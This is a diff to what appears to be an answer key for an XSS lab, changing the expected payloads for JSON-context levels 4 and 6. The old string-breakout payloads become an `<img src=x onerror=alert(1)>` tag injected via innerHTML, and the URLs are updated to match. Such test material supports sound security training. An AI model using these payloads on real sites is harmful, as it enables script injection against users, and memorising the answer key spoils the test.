@@ -34,10 +34,10 @@ JSON-context reflections: JSONP callbacks, embedded JSON in script blocks, and D
 
 ### json-xss-level4
 
-`/json/level4/?query=%22;alert(1);//`
+`/json/level4/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `";alert(1);//`
-- context: inside JS string literal in inline `<script>`
+- payload: `<img src=x onerror=alert(1)>`
+- context: JSON string value later written via innerHTML; a tag needs no breakout
 
 ### json-xss-level5
 
@@ -48,7 +48,7 @@ JSON-context reflections: JSONP callbacks, embedded JSON in script blocks, and D
 
 ### json-xss-level6
 
-`/json/level6/?query=%22%7D%7D;alert(1);//`
+`/json/level6/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `"}};alert(1);//`
-- context: nested JSON string in inline script
+- payload: `<img src=x onerror=alert(1)>`
+- context: nested JSON string value later written via innerHTML; a tag needs no breakout
